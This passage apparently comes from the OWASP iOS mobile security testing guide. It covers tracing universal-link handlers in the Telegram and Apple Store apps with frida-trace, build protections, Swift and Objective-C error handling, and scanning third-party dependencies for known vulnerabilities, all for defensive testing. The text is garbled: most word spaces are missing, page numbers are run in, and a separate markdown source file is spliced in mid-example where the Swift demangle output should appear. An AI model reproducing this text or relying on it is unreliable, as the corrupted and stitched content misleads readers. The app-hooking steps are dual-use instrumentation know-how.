HandlerMethod”forsomeexamplesonhookingandtracingthismethod. Dynamic Analysis Ifanappisimplementinguniversallinks,youshouldhavethefollowingoutputsfromthestaticanalysis: • theassociateddomains • theAppleAppSiteAssociationfile • thelinkreceivermethod • thedatahandlermethod Youcanusethisnowtodynamicallytestthem: • Triggeringuniversallinks • Identifyingvaliduniversallinks • Tracingthelinkreceivermethod • Checkinghowthelinksareopened Triggering Universal Links UnlikecustomURLschemes,unfortunatelyyoucannottestuniversallinksfromSafarijustbytypingtheminthesearch bardirectlyasthisisnotallowedbyApple. ButyoucantestthemanytimeusingotherappsliketheNotesapp: • OpentheNotesappandcreateanewnote. • Writethelinksincludingthedomain. • LeavetheeditingmodeintheNotesapp. • Longpressthelinkstoopenthem(rememberthatastandardclicktriggersthedefaultoption). TodoitfromSafariyouwillhavetofindanexistinglinkonawebsitethatonceclicked, itwillberecognizedasa UniversalLink. Thiscanbeabittimeconsuming. AlternativelyyoucanalsouseFridaforthis,seethesection“PerformingURLRequests”formoredetails. Identifying Valid Universal Links FirstofallwewillseethedifferencebetweenopeninganallowedUniversalLinkandonethatshouldn’tbeallowed. Fromtheapple-app-site-associationofapple.comwehaveseenabovewechosethefollowingpaths: "paths":[ "NOT/shop/buy-iphone/*", ... "/today", Oneofthemshouldofferthe“Openinapp”optionandtheothershouldnot. Ifwelongpressonthefirstone(http://www.apple.com/shop/buy-iphone/iphone-xr)itonlyofferstheoptiontoopen it(inthebrowser). 491\nIfwelongpressonthesecond(http://www.apple.com/today)itshowsoptionstoopenitinSafariandin“AppleStore”: 492\nNote that there is a difference between a click and a long press. Once we long press a link and select an option, e.g. “Open in Safari”, this will become the default option for all future clicks until we long press again and select anotheroption. Ifwerepeattheprocessonthemethodapplication:continueUserActivity:restorationHandler: byeitherhooking ortracing,wewillseehowitgetscalledassoonasweopenthealloweduniversallink. Forthisyoucanuseforexample frida-trace: frida-trace -U"AppleStore" -m"*[**restorationHandler*]" Tracing the Link Receiver Method Thissectionexplainshowtotracethelinkreceivermethodandhowtoextractadditionalinformation. Forthisexample, wewilluseTelegram,astherearenorestrictionsinitsapple-app-site-associationfile: 493\n{ "applinks":{ "apps":[], "details":[ { "appID":"X834Q8SBVP.org.telegram.TelegramEnterprise", "paths":[ "*" ] }, { "appID":"C67CF9S4VU.ph.telegra.Telegraph", "paths":[ "*" ] }, { "appID":"X834Q8SBVP.org.telegram.Telegram-iOS", "paths":[ "*" ] } ] } } InordertoopenthelinkswewillalsousetheNotesappandfrida-tracewiththefollowingpattern: frida-trace -UTelegram -m"*[**restorationHandler*]" Writehttps://t.me/addstickers/radare(foundthroughaquickInternetresearch)andopenitfromtheNotesapp. 494\nFirstweletfrida-tracegeneratethestubsin__handlers__/: $frida-trace -UTelegram -m"*[**restorationHandler*]" Instrumentingfunctions... -[AppDelegateapplication:continueUserActivity:restorationHandler:] Youcanseethatonlyonefunctionwasfoundandisbeinginstrumented. Triggernowtheuniversallinkandobservethe traces. 298382ms -[AppDelegate application:0x10556b3c0continueUserActivity:0x1c4237780 restorationHandler:0x16f27a898] Youcanobservethatthefunctionisinfactbeingcalled. Youcannowaddcodetothestubsin__handlers__/toobtain moredetails: 495\n//__handlers__/__AppDelegate_application_contin_8e36bbb1.js onEnter:function (log,args,state){ log("-[AppDelegateapplication:" +args[2]+"continueUserActivity:" + args[3]+ "restorationHandler:" +args[4]+"]"); log("\tapplication:" +ObjC.Object(args[2]).toString()); log("\tcontinueUserActivity:" +ObjC.Object(args[3]).toString()); log("\t\twebpageURL:" +ObjC.Object(args[3]).webpageURL().toString()); log("\t\tactivityType:" +ObjC.Object(args[3]).activityType().toString()); log("\t\tuserInfo:" +ObjC.Object(args[3]).userInfo().toString()); log("\trestorationHandler:" +ObjC.Object(args[4]).toString()); }, Thenewoutputis: 298382ms -[AppDelegate application:0x10556b3c0continueUserActivity:0x1c4237780 restorationHandler:0x16f27a898] 298382ms application:<Application:0x10556b3c0> 298382ms continueUserActivity:<NSUserActivity:0x1c4237780> 298382ms webpageURL:http://t.me/addstickers/radare 298382ms activityType:NSUserActivityTypeBrowsingWeb 298382ms userInfo:{ } 298382ms restorationHandler:<__NSStackBlock__:0x16f27a898> Apartfromthefunctionparameterswehaveaddedmoreinformationbycallingsomemethodsfromthemtogetmore details,inthiscaseabouttheNSUserActivity. IfwelookintheAppleDeveloperDocumentationwecanseewhatelse wecancallfromthisobject. Checking How the Links Are Opened IfyouwanttoknowmoreaboutwhichfunctionactuallyopenstheURLandhowthedataisactuallybeinghandledyou shouldkeepinvestigating. ExtendthepreviouscommandinordertofindoutifthereareanyotherfunctionsinvolvedintoopeningtheURL. frida-trace -UTelegram -m"*[**restorationHandler*]" -i"*open*Url*" -iincludesanymethod. Youcanalsouseaglobpatternhere(e.g.-i "*open*Url*"means“includeanyfunction containing‘open’,then‘Url’andsomethingelse”) Again,wefirstletfrida-tracegeneratethestubsin__handlers__/: $frida-trace -UTelegram -m"*[**restorationHandler*]" -i"*open*Url*" Instrumentingfunctions... -[AppDelegateapplication:continueUserActivity:restorationHandler:] $S10TelegramUI0A19ApplicationBindingsC16openUniversalUrlyySS_AA0ac4OpenG10Completion... $S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData18application... $S10TelegramUI31AuthorizationSequenceControllerC7account7strings7openUrl5apiId0J4HashAC0A4Core19... ... Nowyoucanseealonglistoffunctionsbutwestilldon’tknowwhichoneswillbecalled. Triggertheuniversallinkagain andobservethetraces. /*TID0x303 */ 298382ms -[AppDelegate application:0x10556b3c0continueUserActivity:0x1c4237780 restorationHandler:0x16f27a898] 298619ms |$S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData 18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA 14OpenURLContextOSSSbAA012PresentationK0CAA0a11ApplicationM0C7Display0 10NavigationO0CSgyyctF() ApartfromtheObjective-Cmethod,nowthereisoneSwiftfunctionthatisalsoofyourinterest. ThereisprobablynodocumentationforthatSwiftfunctionbutyoucanjustdemangleitssymbolusingswift-demangle viaxcrun: 496\nxcruncanbeusedinvokeXcodedevelopertoolsfromthecommand-line,withouthavingtheminthepath. Inthis caseitwilllocateandrunswift-demangle,anXcodetoolthatdemanglesSwiftsymbols. $xcrunswift-demangleS10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData 18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA14OpenURLContextOSSSbAA0 12PresentationK0CAA0a11ApplicationM0C7Display010NavigationO0CSgyyctF Resultingin: --- masvs_category:MASVS-CODE platform:ios --- #iOSCodeQualityandBuildSettings ##Overview ###AppSigning [Codesigning](0x06a-Platform-Overview.md#code-signing)yourappassuresusersthattheapphasaknownsourceandhasn'tbeenmodifiedsinceitwaslastsigned. ↪ Beforeyourappcanintegrateappservices,beinstalledonanon-jailbrokendevice,orbesubmittedtotheAppStore, itmustbesignedwithacertificate ↪ issuedbyApple.Formoreinformationonhowtorequestcertificatesandcodesignyourapps,reviewthe[AppDistribution ↪ Guide](https://developer.apple.com/library/content/documentation/IDEs/Conceptual/AppDistributionGuide/Introduction/Introduction.html"AppDistribution ↪ Guide"). ###Third-PartyLibraries iOSapplicationsoftenmakeuseofthirdpartylibrarieswhichacceleratedevelopmentasthedeveloperhastowritelesscode inordertosolveaproblem. ↪ However,thirdpartylibrariesmaycontainvulnerabilities,incompatiblelicensing,ormaliciouscontent.Additionally,itisdifficultfororganizationsand ↪ developerstomanageapplicationdependencies,includingmonitoringlibraryreleasesandapplyingavailablesecuritypatches. Therearethreewidelyusedpackagemanagementtools[SwiftPackageManager](https://swift.org/package-manager"SwiftPackageManageronSwift.org"), ↪ [Carthage](https://github.com/Carthage/Carthage"CarthageonGitHub"),and[CocoaPods](https://cocoapods.org"CocoaPods.org"): -TheSwiftPackageManagerisopensource,includedwiththeSwiftlanguage,integratedintoXcode(sinceXcode11)and supports[Swift,Objective-C, ↪ Objective-C++,C,andC++](https://developer.apple.com/documentation/xcode/swift-packages"SwiftPackagesDocumentation")packages.ItiswritteninSwift, ↪ decentralizedandusesthePackage.swiftfiletodocumentandmanageprojectdependencies. -CarthageisopensourceandcanbeusedforSwiftandObjective-Cpackages.ItiswritteninSwift,decentralized andusestheCartfilefiletodocumentand ↪ manageprojectdependencies. -CocoaPodsisopensourceandcanbeusedforSwiftandObjective-Cpackages.ItiswritteninRuby,utilizes acentralizedpackageregistryforpublicand ↪ privatepackagesandusesthePodfilefiletodocumentandmanageprojectdependencies. Therearetwocategoriesoflibraries: -Librariesthatarenot(orshouldnot)bepackedwithintheactualproductionapplication,suchas`OHHTTPStubs`usedfor testing. -Librariesthatarepackedwithintheactualproductionapplication,suchas`Alamofire`. Theselibrariescanleadtounwantedside-effects: -Alibrarycancontainavulnerability,whichwillmaketheapplicationvulnerable.Agoodexampleis`AFNetworking`version2.5.1, whichcontainedabugthat ↪ disabledcertificatevalidation.Thisvulnerabilitywouldallowattackerstoexecuteman-in-the-middleattacksagainstappsthatareusingthelibraryto ↪ connecttotheirAPIs. -Alibrarycannolongerbemaintainedorhardlybeused,whichiswhynovulnerabilitiesarereportedand/or fixed.Thiscanleadtohavingbadand/or ↪ vulnerablecodeinyourapplicationthroughthelibrary. -Alibrarycanusealicense,suchasLGPL2.1,whichrequirestheapplicationauthortoprovideaccesstothe sourcecodeforthosewhousetheapplicationand ↪ requestinsightinitssources.Infacttheapplicationshouldthenbeallowedtoberedistributedwithmodificationstoits sourcecode.Thiscanendanger ↪ theintellectualproperty(IP)oftheapplication. Pleasenotethatthisissuecanholdonmultiplelevels:WhenyouusewebviewswithJavaScriptrunninginthewebview, theJavaScriptlibrariescanhavethese ↪ issuesaswell.Thesameholdsforplugins/librariesforCordova,React-nativeandXamarinapps. ###MemoryCorruptionBugs iOSapplicationshavevariouswaystoruninto[memorycorruptionbugs](0x04h-Testing-Code-Quality.md#memory-corruption-bugs):firsttherearethenativecode ↪ issueswhichhavebeenmentionedinthegeneralMemoryCorruptionBugssection.Next,therearevariousunsafeoperationswithboth Objective-CandSwiftto ↪ actuallywraparoundnativecodewhichcancreateissues.Last,bothSwiftandObjective-Cimplementationscanresultinmemoryleaks duetoretaining ↪ objectswhicharenolongerinuse. Learnmore: -<https://developer.ibm.com/tutorials/mo-ios-memory/> -<https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/MemoryMgmt/Articles/MemoryMgmt.html> -<https://medium.com/zendesk-engineering/ios-identifying-memory-leaks-using-the-xcode-memory-graph-debugger-e84f097b9d15> ###BinaryProtectionMechanisms Detectingthepresenceof[binaryprotectionmechanisms](0x04h-Testing-Code-Quality.md#binary-protection-mechanisms)heavilydependonthelanguageusedfor ↪ developingtheapplication. AlthoughXcodeenablesallbinarysecurityfeaturesbydefault,itmayberelevanttoverifythisforoldapplicationsor tocheckforcompilerflag ↪ misconfigurations.Thefollowingfeaturesareapplicable: -[**PIE(PositionIndependentExecutable)**](0x04h-Testing-Code-Quality.md#position-independent-code): -PIEappliestoexecutablebinaries(Mach-Otype`MH_EXECUTE`). -Howeverit'snotapplicableforlibraries(Mach-Otype`MH_DYLIB`). 497\n-[**Memorymanagement**](0x04h-Testing-Code-Quality.md#memory-management): -BothpureObjective-C,SwiftandhybridbinariesshouldhaveARC(AutomaticReferenceCounting)enabled. -ForC/C++libraries,thedeveloperisresponsiblefordoingproper[manualmemorymanagement](0x04h-Testing-Code-Quality.md#manual-memory-management).See ↪ ["MemoryCorruptionBugs"](0x04h-Testing-Code-Quality.md#memory-corruption-bugs). -[**StackSmashingProtection**](0x04h-Testing-Code-Quality.md#stack-smashing-protection):ForpureObjective-Cbinaries,thisshouldalwaysbeenabled.Since ↪ Swiftisdesignedtobememorysafe,ifalibraryispurelywritteninSwift,andstackcanariesweren’tenabled, theriskwillbeminimal. Learnmore: -[OSXABIMach-OFileFormatReference](https://github.com/aidansteele/osx-abi-macho-file-format-reference) -[OniOSBinaryProtections](https://sensepost.com/blog/2021/on-ios-binary-protections/) -[SecurityofruntimeprocessiniOSandiPadOS](https://support.apple.com/en-gb/guide/security/sec15bfe098e/web) -[Mach-OProgrammingTopics-Position-Independent ↪ Code](https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/MachOTopics/1-Articles/dynamic_code.html) Teststodetectthepresenceoftheseprotectionmechanismsheavilydependonthelanguageusedfordevelopingtheapplication.For example,existingtechniques ↪ fordetectingthepresenceofstackcanariesdonotworkforpureSwiftapps. ####XcodeProjectSettings #####StackCanaryprotection StepsforenablingstackcanaryprotectioninaniOSapplication: 1.InXcode,selectyourtargetinthe"Targets"section,thenclickthe"BuildSettings"tabtoviewthetarget's settings. 2.Makesurethatthe"-fstack-protector-all"optionisselectedinthe"OtherCFlags"section. 3.MakesurethatPositionIndependentExecutables(PIE)supportisenabled. #####PIEprotection StepsforbuildinganiOSapplicationasPIE: 1.InXcode,selectyourtargetinthe"Targets"section,thenclickthe"BuildSettings"tabtoviewthetarget's settings. 2.SettheiOSDeploymentTargettoiOS4.3orlater. 3.Makesurethat"GeneratePosition-DependentCode"(section"AppleClang-CodeGeneration")issettoitsdefaultvalue("NO"). 4.Makesurethat"GeneratePosition-DependentExecutable"(section"Linking")issettoitsdefaultvalue("NO"). #####ARCprotection ARCisautomaticallyenabledforSwiftappsbythe`swiftc`compiler.However,forObjective-Cappsyou'llhaveensurethatit'senabledbyfollowingthesesteps: 1.InXcode,selectyourtargetinthe"Targets"section,thenclickthe"BuildSettings"tabtoviewthetarget's settings. 2.Makesurethat"Objective-CAutomaticReferenceCounting"issettoitsdefaultvalue("YES"). Seethe[TechnicalQ&AQA1788BuildingaPositionIndependentExecutable](https://developer.apple.com/library/mac/qa/qa1788/_index.html"TechnicalQ&AQA1788 ↪ BuildingaPositionIndependentExecutable"). ###DebuggableApps Appscanbemade[debuggable](0x06c-Reverse-Engineering-and-Tampering.md#debugging)byaddingthe ↪ [`get-task-allow`](https://developer.apple.com/documentation/security/notarizing_macos_software_before_distribution/resolving_common_notarization_issues ↪ "Resolvingcommonnotarizationissues")keytotheappentitlementsfileandsettingitto`true`. Whiledebuggingisausefulfeaturewhendevelopinganapp,ithastobeturnedoffbeforereleasingappstotheAppStoreorwithinanenterpriseprogram.Todo ↪ thatyouneedtodeterminethemodeinwhichyourappistobegeneratedtochecktheflagsin theenvironment: -Selectthebuildsettingsoftheproject -Under'AppleLVM-Preprocessing'and'PreprocessorMacros',makesure'DEBUG'or'DEBUG_MODE'isnotselected(Objective-C) -Makesurethatthe"Debugexecutable"optionisnotselected. -Orinthe'SwiftCompiler-CustomFlags'section/'OtherSwiftFlags',makesurethe'-DDEBUG'entry doesnotexist. ###DebuggingSymbols Asagoodpractice,aslittleexplanatoryinformationaspossibleshouldbeprovidedwithacompiledbinary.Thepresenceof additionalmetadatasuchasdebug ↪ symbolsmightprovidevaluableinformationaboutthecode,e.g.functionnamesleakinginformationaboutwhatafunctiondoes.Thismetadata isnotrequired ↪ toexecutethebinaryandthusitissafetodiscarditforthereleasebuild,whichcanbedone byusingpropercompilerconfigurations.Asatesteryou ↪ shouldinspectallbinariesdeliveredwiththeappandensurethatnodebuggingsymbolsarepresent(atleastthoserevealing anyvaluableinformationabout ↪ thecode). WhenaniOSapplicationiscompiled,thecompilergeneratesalistofdebugsymbolsforeachbinaryfileinan app(themainappexecutable,frameworks,andapp ↪ extensions).Thesesymbolsincludeclassnames,globalvariables,andmethodandfunctionnameswhicharemappedtospecificfilesand linenumberswhere ↪ they'redefined.[Debugbuilds](https://developer.apple.com/documentation/xcode/building-your-app-to-include-debugging-information"BuildingYourAppto ↪ IncludeDebuggingInformation")ofanappplacethedebugsymbolsinacompiledbinarybydefault,whilereleasebuildsof anappplacetheminacompanion ↪ _DebugSymbolfile_(dSYM)toreducethesizeofthedistributedapp. ###DebuggingCodeandErrorLogging Tospeedupverificationandgetabetterunderstandingoferrors,developersoftenincludedebuggingcode,suchasverboselogging statements(using`NSLog`, ↪ `println`,`print`,`dump`,and`debugPrint`)aboutresponsesfromtheirAPIsandabouttheirapplication'sprogressand/orstate.Furthermore,theremay be ↪ debuggingcodefor"management-functionality",whichisusedbydeveloperstosettheapplication'sstateormockresponsesfromanAPI. Reverseengineers ↪ caneasilyusethisinformationtotrackwhat'shappeningwiththeapplication.Therefore,debuggingcodeshouldberemovedfromthe application'srelease ↪ version. ###ExceptionHandling Exceptionsoftenoccurafteranapplicationentersanabnormalorerroneousstate. Testingexceptionhandlingisaboutmakingsurethattheapplicationwillhandletheexceptionandgetintoasafestate withoutexposinganysensitive ↪ informationviaitsloggingmechanismsortheUI. BearinmindthatexceptionhandlinginObjective-CisquitedifferentfromexceptionhandlinginSwift.Bridgingthetwoapproaches inanapplicationthatis ↪ writteninbothlegacyObjective-CcodeandSwiftcodecanbeproblematic. 498\n####ExceptionHandlinginObjective-C Objective-Chastwotypesoferrors: **NSException:** `NSException`isusedtohandleprogrammingandlow-levelerrors(e.g.,divisionby0andout-of-boundsarrayaccess). An`NSException`caneitherberaisedby`raise`orthrownwith`@throw`.Unlesscaught,thisexceptionwillinvoketheunhandled exceptionhandler,withwhich ↪ youcanlogthestatement(loggingwillhalttheprogram).`@catch`allowsyoutorecoverfromtheexceptionifyou're usinga`@try`-`@catch`-block: ```objectivec @try{ //doworkhere } @catch(NSException*e){ //recoverfromexception } @finally{ //cleanup BearinmindthatusingNSExceptioncomeswithmemorymanagementpitfalls: youneedtocleanupallocationsfrom thetryblockthatareinthefinallyblock. NotethatyoucanpromoteNSExceptionobjectstoNSErrorbyinstantiatingan NSErrorinthe@catchblock. NSError: NSErrorisusedforallothertypesoferrors. SomeCocoaframeworkAPIsprovideerrorsasobjectsintheirfailurecallback incasesomethinggoeswrong; thosethatdon’tprovidethempassapointertoanNSErrorobjectbyreference. Itisa goodpracticetoprovideaBOOLreturntypetothemethodthattakesapointertoanNSErrorobjecttoindicatesuccess orfailure. Ifthere’sareturntype,makesuretoreturnnilforerrors. IfNOornilisreturned,itallowsyoutoinspectthe error/reasonforfailure. Exception Handling in Swift ExceptionhandinginSwift(2-5)isquitedifferent. Thetry-catchblockisnottheretohandleNSException. Theblockis usedtohandleerrorsthatconformtotheError(Swift3)orErrorType(Swift2)protocol. Thiscanbechallengingwhen Objective-CandSwiftcodearecombinedinanapplication. Therefore,NSErrorispreferabletoNSExceptionforprograms writteninbothlanguages. Furthermore,error-handlingisopt-ininObjective-C,butthrowsmustbeexplicitlyhandledin Swift. Toconverterror-throwing,lookattheAppledocumentation. Methodsthatcanthrowerrorsusethethrowskeyword. TheResulttyperepresentsasuccessorfailure,seeResult,HowtouseResultinSwift5andThepowerofResulttypes inSwift. TherearefourwaystohandleerrorsinSwift: • Propagate the error from a function to the code that calls that function. In this situation, there’s no do-catch; there’sonlyathrowthrowingtheactualerrororatrytoexecutethemethodthatthrows. Themethodcontaining thetryalsorequiresthethrowskeyword: funcdosomething(argumentx:TypeX)throws{ tryfunctionThatThrows(argumentx:argumentx) } • Handletheerrorwithado-catchstatement. Youcanusethefollowingpattern: funcdoTryExample() { do{ tryfunctionThatThrows(number: 203) }catch NumberError.lessThanZero{ //Handle numberislessthanzero }catch letNumberError.tooLarge(delta){ //Handle numberistoolarge(withdeltavalue) }catch { //Handle anyothererrors } } enumNumberError: Error{ caselessThanZero casetooLarge(Int) casetooSmall(Int) } funcfunctionThatThrows(number: Int)throws->Bool{ ifnumber <0{ throwNumberError.lessThanZero 499\n}else ifnumber<10{ throwNumberError.tooSmall(10 -number) }else ifnumber>100{ throwNumberError.tooLarge(100 -number) }else { returntrue } } • Handletheerrorasanoptionalvalue: letx =try?functionThatThrows() //In thiscasethevalueofxisnilincaseofanerror. • Usethetry! expressiontoassertthattheerrorwon’toccur. • HandlethegenericerrorasaResultreturn: enumErrorType:Error{ casetypeOne casetypeTwo } funcfunctionWithResult(param:String?)->Result<String,ErrorType>{ guardletvalue=paramelse{ return.failure(.typeOne) } return.success(value) } funccallResultFunction(){ letresult=functionWithResult(param:"OWASP") switchresult{ caselet.success(value): //Handlesuccess caselet.failure(error): //Handlefailure(witherror) } } • HandlenetworkandJSONdecodingerrorswithaResulttype: structMSTG:Codable{ varroot:String varplugins:[String] varstructure:MSTGStructure vartitle:String varlanguage:String vardescription:String } structMSTGStructure:Codable{ varreadme:String } enumRequestError:Error{ caserequestError(Error) casenoData casejsonError } funcgetMSTGInfo(){ guardleturl=URL(string:"https://raw.githubusercontent.com/OWASP/owasp-mastg/master/book.json")else{ return } request(url:url){resultin switchresult{ caselet.success(data): //HandlesuccesswithMSTGdata letmstgTitle=data.title letmstgDescription=data.description caselet.failure(error): //Handlefailure switcherror{ caselet.requestError(error): //Handlerequesterror(witherror) case.noData: //Handlenodatareceivedinresponse case.jsonError: //HandleerrorparsingJSON } } } } 500\nfuncrequest(url:URL,completion:@escaping(Result<MSTG,RequestError>)->Void){ lettask=URLSession.shared.dataTask(with:url){data,_,errorin ifleterror=error{ returncompletion(.failure(.requestError(error))) }else{ ifletdata=data{ letdecoder=JSONDecoder() guardletresponse=try?decoder.decode(MSTG.self,from:data)else{ returncompletion(.failure(.jsonError)) } returncompletion(.success(response)) } } } task.resume() } Testing Object Persistence Platform: ios MASVSV1: MSTG-PLATFORM-8 MASVSV2: MASVS-CODE-4 Overview Static Analysis Alldifferentflavorsofobjectpersistencesharethefollowingconcerns: • Ifyouuseobjectpersistencetostoresensitiveinformationonthedevice,thenmakesurethatthedataisencrypted: eitheratthedatabaselevel,orspecificallyatthevaluelevel. • Needtoguaranteetheintegrityoftheinformation? UseanHMACmechanismorsigntheinformationstored. Always verifytheHMAC/signaturebeforeprocessingtheactualinformationstoredintheobjects. • MakesurethatkeysusedinthetwonotionsabovearesafelystoredintheKeyChainandwellprotected. Seethe chapter“DataStorageoniOS”formoredetails. • Ensurethatthedatawithinthedeserializedobjectiscarefullyvalidatedbeforeitisactivelyused(e.g.,noexploit ofbusiness/applicationlogicispossible). • DonotusepersistencemechanismsthatuseRuntimeReferencetoserialize/deserializeobjectsinhigh-riskappli- cations,astheattackermightbeabletomanipulatethestepstoexecutebusinesslogicviathismechanism(see thechapter“iOSAnti-ReversingDefenses”formoredetails). • NotethatinSwift2andbeyond,aMirrorcanbeusedtoreadpartsofanobject,butcannotbeusedtowriteagainst theobject. Dynamic Analysis Thereareseveralwaystoperformdynamicanalysis: • Fortheactualpersistence: Usethetechniquesdescribedinthe“DataStorageoniOS”chapter. • For the serialization itself: Use a debug build or use Frida / objection to see how the serialization methods are handled(e.g.,whethertheapplicationcrashesorextrainformationcanbeextractedbyenrichingtheobjects). Memory Corruption Bugs Platform: ios MASVSV1: MSTG-CODE-8 MASVSV2: MASVS-CODE-4 501\nOverview Static Analysis Aretherenativecodeparts? Ifso: checkforthegivenissuesinthegeneralmemorycorruptionsection. Nativecodeisa littlehardertospotwhencompiled. IfyouhavethesourcesthenyoucanseethatCfilesuse.csourcefilesand.hheader files and C++ uses .cpp files and .h files. This is a little different from the .swift and the .m source files for Swift and Objective-C.Thesefilescanbepartofthesources,orpartofthirdpartylibraries,registeredasframeworksandimported throughvarioustools,suchasCarthage,theSwiftPackageManagerorCocoapods. Foranymanagedcode(Objective-C/Swift)intheproject,checkthefollowingitems: • ThedoubleFreeissue: whenfreeiscalledtwiceforagivenregioninsteadofonce. • Retainingcycles: lookforcyclicdependenciesbymeansofstrongreferencesofcomponentstooneanotherwhich keepmaterialsinmemory. • UsinginstancesofUnsafePointercanbemanagedwrongly,whichwillallowforvariousmemorycorruptionissues. • TryingtomanagethereferencecounttoanobjectbyUnmanagedmanually,leadingtowrongcounternumbersand atoolate/toosoonrelease. AgreattalkisgivenonthissubjectatRealmacademyandanicetutorialtoseewhatisactuallyhappeningisprovided byRayWenderlichonthissubject. PleasenotethatwithSwift5youcanonlydeallocatefullblocks,whichmeanstheplaygroundhaschangedabit. Dynamic Analysis There are various tools provided which help to identify memory bugs within Xcode, such as the Debug Memory graph introducedinXcode8andtheAllocationsandLeaksinstrumentinXcode. Next,youcancheckwhethermemoryisfreedtoofastortooslowbyenablingNSAutoreleaseFreedObjectCheckEnabled, NSZombieEnabled,NSDebugEnabledinXcodewhiletestingtheapplication. Therearevariouswellwrittenexplanationswhichcanhelpwithtakingcareofmemorymanagement. Thesecanbefound inthereferencelistofthischapter. Testing Enforced Updating Platform: ios MASVSV1: MSTG-ARCH-9 MASVSV2: MASVS-CODE-2 Overview Static Analysis Firstseewhetherthereisanupdatemechanismatall: ifitisnotyetpresent,itmightmeanthatuserscannotbeforced toupdate. Ifthemechanismispresent,seewhetheritenforces“alwayslatest”andwhetherthatisindeedinlinewith thebusinessstrategy. Otherwisecheckifthemechanismissupportingtoupdatetoagivenversion. Makesurethatevery entryoftheapplicationgoesthroughtheupdatingmechanisminordertomakesurethattheupdate-mechanismcannot bebypassed. Dynamic analysis Inordertotestforproperupdating: trydownloadinganolderversionoftheapplicationwithasecurityvulnerability,either byareleasefromthedevelopersorbyusingathirdpartyapp-store. Next,verifywhetherornotyoucancontinuetouse 502\ntheapplicationwithoutupdatingit. Ifanupdatepromptisgiven,verifyifyoucanstillusetheapplicationbycancelingthe prompt or otherwise circumventing it through normal application usage. This includes validating whether the backend willstopcallstovulnerablebackendsand/orwhetherthevulnerableapp-versionitselfisblockedbythebackend. Finally, seeifyoucanplaywiththeversionnumberofaman-in-the-middledappandseehowthebackendrespondstothis(and ifitisrecordedatallforinstance). Checking for Weaknesses in Third Party Libraries Platform: ios MASVSV1: MSTG-CODE-5 MASVSV2: MASVS-CODE-3 Overview Static Analysis Detecting vulnerabilities of third party libraries Inordertoensurethatthelibrariesusedbytheappsarenotcarryingvulnerabilities,onecanbestcheckthedependencies installedbyCocoaPodsorCarthage. Swift Package Manager IncaseSwiftPackageManagerisusedformanagingthirdpartydependencies,thefollowingstepscanbetakentoanalyze thethirdpartylibrariesforvulnerabilities: First,attherootoftheproject,wherethePackage.swiftfileislocated,type swiftbuild Next, checkthefilePackage.resolvedfortheactualversionsusedandinspectthegivenlibrariesforknownvulnerabili- ties. YoucanutilizetheOWASPDependency-Check’sexperimentalSwiftPackageManagerAnalyzertoidentifytheCommon PlatformEnumeration(CPE)namingschemeofalldependenciesandanycorrespondingCommonVulnerabilityandExpo- sure(CVE)entries. Scantheapplication’sPackage.swiftfileandgenerateareportofknownvulnerablelibrarieswiththe followingcommand: dependency-check --enableExperimental --out .--scan Package.swift CocoaPods IncaseCocoaPodsisusedformanagingthirdpartydependencies,thefollowingstepscanbetakentoanalyzethethird partylibrariesforvulnerabilities. First,attherootoftheproject,wherethePodfileislocated,executethefollowingcommands: sudo geminstallcocoapods podinstall Next,nowthatthedependencytreehasbeenbuilt,youcancreateanoverviewofthedependenciesandtheirversions byrunningthefollowingcommands: sudo geminstallcocoapods-dependencies poddependencies Theresultofthestepsabovecannowbeusedasinputforsearchingdifferentvulnerabilityfeedsforknownvulnerabili- ties. 503\nNote: 1. If the developer packs all dependencies in terms of its own support library using a .podspec file, then this .podspecfilecanbecheckedwiththeexperimentalCocoaPodspodspecchecker. 2. IftheprojectusesCocoaPodsincombinationwithObjective-C,SourceClearcanbeused. 3. Using CocoaPods with HTTP-based links instead of HTTPS might allow for man-in-the-middle attacks during the download of the dependency, allowing an attacker to replace (parts of) the library with other content. Therefore,alwaysuseHTTPS. YoucanutilizetheOWASPDependency-Check’sexperimentalCocoaPodsAnalyzertoidentifytheCommonPlatformEnu- meration (CPE) naming scheme of all dependencies and any corresponding Common Vulnerability and Exposure (CVE) entries. Scantheapplication’s*.podspecand/orPodfile.lockfilesandgenerateareportofknownvulnerablelibrarieswith thefollowingcommand: dependency-check --enableExperimental --out .--scan Podfile.lock Carthage IncaseCarthageisusedforthirdpartydependencies, thenthefollowingstepscanbetakentoanalyzethethirdparty librariesforvulnerabilities. First,attherootoftheproject,wheretheCartfileislocated,type brewinstallcarthage carthageupdate --platform iOS Next,checktheCartfile.resolvedforactualversionsusedandinspectthegivenlibrariesforknownvulnerabilities. Note, atthetimeofwritingthischapter, thereisnoautomatedsupportforCarthagebaseddependencyanalysis knowntotheauthors. Atleast,thisfeaturewasalreadyrequestedfortheOWASPDependencyChecktoolbutnot yetimplemented(seetheGitHubissue). Discovered library vulnerabilities Whenalibraryisfoundtocontainvulnerabilities,thenthefollowingreasoningapplies: • Isthelibrarypackagedwiththeapplication? Thencheckwhetherthelibraryhasaversioninwhichthevulnerability ispatched. Ifnot,checkwhetherthevulnerabilityactuallyaffectstheapplication. Ifthatisthecaseormightbethe caseinthefuture,thenlookforanalternativewhichprovidessimilarfunctionality,butwithoutthevulnerabilities. • Isthelibrarynotpackagedwiththeapplication? Seeifthereisapatchedversioninwhichthevulnerabilityisfixed. If thisisnotthecase,checkiftheimplicationsofthevulnerabilityforthebuildprocess. Couldthevulnerabilityimpede abuildorweakenthesecurityofthebuild-pipeline? Thentrylookingforanalternativeinwhichthevulnerabilityis fixed. Incaseframeworksareaddedmanuallyaslinkedlibraries: 1. Openthexcodeprojfileandchecktheprojectproperties. 2. Go to the tab Build Phases and check the entries in Link Binary With Libraries for any of the libraries. See earliersectionsonhowtoobtainsimilarinformationusingMobSF. Inthecaseofcopy-pastedsources: searchtheheaderfiles(incaseofusingObjective-C)andotherwisetheSwiftfilesfor knownmethodnamesforknownlibraries. Next, note that for hybrid applications, you will have to check the JavaScript dependencies with RetireJS. Similarly for Xamarin,youwillhavetochecktheC#dependencies. Last,iftheapplicationisahigh-riskapplication,youwillendupvettingthelibrarymanually. Inthatcasetherearespecific requirements for native code, which are similar to the requirements established by the MASVS for the application as a whole. Nexttothat,itisgoodtovetwhetherallbestpracticesforsoftwareengineeringareapplied. 504\nDynamic Analysis Thedynamicanalysisofthissectioncomprisesoftwoparts: 